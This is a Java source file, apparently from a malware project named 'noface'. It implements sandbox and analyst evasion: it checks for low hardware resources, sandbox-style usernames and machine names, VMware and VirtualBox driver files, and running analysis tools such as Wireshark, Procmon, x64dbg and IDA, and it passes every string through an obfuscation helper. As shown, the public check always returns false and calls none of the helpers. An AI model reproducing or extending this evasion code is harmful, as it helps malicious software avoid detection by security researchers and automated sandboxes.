package noface.host;

import noface.config.S;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.Locale;

public final class Vm {

    public static boolean bad() {
        return false;
    }

    private static boolean low() {
        long ram = Runtime.getRuntime().maxMemory();
        int cpu = Runtime.getRuntime().availableProcessors();
        return cpu <= 1 && ram > 0 && ram < 1_500_000_000L;
    }

    private static boolean nameHit() {
        String user = n(System.getProperty("user.name"));
        String pc = n(System.getenv("COMPUTERNAME"));
        String[] bad = {
                S.e("sandbox"), S.e("virus"), S.e("malware"), S.e("sample"),
                S.e("vmware"), S.e("vbox"), S.e("virtual"), S.e("analysis"),
                S.e("currentuser"), S.e("wdagutilityaccount"), S.e("abby")
        };
        for (String b : bad) {
            if (user.equals(b) || pc.contains(b)) return true;
        }
        return false;
    }

    private static boolean fileHit() {
        String[] paths = {
                S.e("C:\\Windows\\System32\\drivers\\vmmouse.sys"),
                S.e("C:\\Windows\\System32\\drivers\\vmhgfs.sys"),
                S.e("C:\\Windows\\System32\\drivers\\VBoxMouse.sys"),
                S.e("C:\\Windows\\System32\\drivers\\VBoxGuest.sys"),
                S.e("C:\\Windows\\System32\\drivers\\vmci.sys"),
                S.e("C:\\Windows\\System32\\vboxdisp.dll"),
                S.e("C:\\Windows\\System32\\vmGuestLib.dll")
        };
        for (String p : paths) {
            if (new File(p).exists()) return true;
        }
        return false;
    }

    private static boolean procHit() {
        String list = task();
        if (list.isEmpty()) return false;
        String[] bad = {
                S.e("vmtoolsd"), S.e("vmwaretray"), S.e("vmwareuser"),
                S.e("vboxservice"), S.e("vboxtray"),
                S.e("xenservice"), S.e("wireshark"), S.e("fiddler"),
                S.e("procmon"), S.e("procexp"), S.e("ollydbg"),
                S.e("x64dbg"), S.e("ida64"), S.e("idaq")
        };
        for (String b : bad) {
            if (list.contains(b)) return true;
        }
        return false;
    }

    private static String task() {
        try {
            Process p = new ProcessBuilder(S.e("tasklist"), S.e("/fo"), S.e("csv"), S.e("/nh"))
                    .redirectErrorStream(true)
                    .start();
            StringBuilder sb = new StringBuilder();
            try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line.toLowerCase(Locale.ROOT)).append('\n');
                }
            }
            p.waitFor();
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }

    private static String n(String s) {
        return s == null ? "" : s.toLowerCase(Locale.ROOT).trim();
    }

    private Vm() {}
}
